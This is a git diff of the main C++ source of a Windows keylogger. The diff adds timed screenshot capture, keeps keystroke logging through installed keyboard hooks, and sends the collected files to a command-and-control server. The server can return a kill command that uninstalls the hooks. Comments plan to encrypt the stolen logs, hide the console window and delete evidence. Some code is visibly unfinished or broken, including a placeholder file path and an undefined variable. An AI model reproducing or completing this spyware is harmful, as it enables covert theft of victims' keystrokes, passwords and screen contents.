@@ -1,14 +1,11 @@
 // TODO delete logs after running them
 // TODO grab screen buffer based on timer
-// TODO Encode screen buffer into base64
-// TODO encrypt mail with a hard coded public key
-// TODO Potentially change from email based delivery system to socket based one
-// TODO potentially add timestamp to every key pressed (or atleast every line)
+// TODO encrypt logs and images with hard coded public key
 // TODO compress screenshots
-// TODO create new email
 // TODO look for strings in executable
 // TODO potentially send debug logs back to user as well
-// TODO see about exiting without joinging thread
+// TODO see about exiting without joining thread (is it dangerous)
+// TODO delete all files when kill response is reached
 
 #include <iostream>
 #include <filesystem>
@@ -22,51 +19,64 @@
 #include "Timer.h"
 #include "MailUtils.h"
 #include "KeyboardManager.h"
+#include "Screenshot.h"
 #include "Socket.h"
 
-// MailTimer Handler function
-void DumpKeylog()
+// LogTimer Handler function
+void WriteKeylog()
 {
 	if (KeyboardManager::GetInstance().keylog.empty())
 		return;
 	
-	std::string filename = IO::WriteLog(KeyboardManager::GetInstance().keylog);
-
-	if (filename.empty())
+	if (IO::WriteLog(KeyboardManager::GetInstance().keylog))
 	{
-		IO::WriteAppLog("File Creation was not succesfull. Keylog'" + KeyboardManager::GetInstance().keylog + "'");
-		return;
+		KeyboardManager::GetInstance().keylog = "";
+		IO::WriteAppLog("Appended to Master Log");
 	}
+	else
+	{
+		IO::WriteAppLog("Master Log file failed to open. Keylog'" + KeyboardManager::GetInstance().keylog + "'");
+	}
+}
 
-	// std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
-	// int x = MailUtils::SendMail("Log [" + filename + "]", "", filename);
+// screenshotTimer Handler function
+void SaveScreenshot()
+{
+	Screenshot ss;
+	ss.Save(a file path that is generated);
+}
 
+// dumpTimer Handler function
+void DumpCache()
+{
 	// Open connection with comand and control server
 	Socket ccSocket(CC_HOSTNAME, CC_PORT);
 	if (!ccSocket.isActive())
+	{
 		IO::WriteAppLog("Connection to " + CC_HOSTNAME + + " on port " + CC_PORT + "failed");
 
+		ccSocket.close();
+		return;	// Files will be left alone
+	}
+
+	// TODO for each file in cache directory
 	RESPONSE_CODE res = ccSocket.sendFile(filename);	
 	if (res == KILL)
 	{
 		KeyboardManager::GetInstance().UninstallHooks();
+		// TODO delete all files
 		exit(0);
-	}
-	else if (res == FAILURE)
-	{
-		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
 	}
 	else if (res == SUCCESS)
 	{
 		KeyboardManager::GetInstance().keylog = "";
-		IO::WriteAppLog("Successfully sent log");
+		// TODO delete file
+		IO::WriteAppLog("Successfully sent file");
 	}
-
-	// If script execution returned success
-	// if (x != 7)
-	// 	IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
-	// else
-	// 	KeyboardManager::GetInstance().keylog = "";
+	else
+	{
+		IO::WriteAppLog("Log failed to send");
+	}
 }
 
 int main(int argc, char** argv)
@@ -77,10 +87,21 @@ int main(int argc, char** argv)
 	// Start Listening to keystrokes
 	KeyboardManager::GetInstance().InstallHooks();
 
-	// Create and Start mail timer
-	Timer dumpTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	// Create and Start log timer
+	Timer logTimer(WriteKeylog, LOG_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	logTimer.Start(true);
+	IO::WriteAppLog("Log Timer Started");
+
+	// Create and Start Screenshot Timer
+	Timer screenshotTimer(SaveScreenshot, SS_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	screenshotTimer.Start(true);
+	IO::WriteAppLog("Screenshot Timer Started");
+
+	// Create and Start Dump Timer
+	Timer dumpTimer(DumpCache, DUMP_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
 	dumpTimer.Start(true);
-	IO::WriteAppLog("Mail Timer Started");
+	IO::WriteAppLog("Dump Timer Started");
+
 
 	// Run infinite loop and prevent console window from showing
 	MSG Msg;
@@ -91,6 +112,9 @@ int main(int argc, char** argv)
 	}
 
 	KeyboardManager::GetInstance().UninstallHooks();
+
+	logTimer.Stop();
+	screenshotTimer.Stop();
 	dumpTimer.Stop();
 
 	return 0;
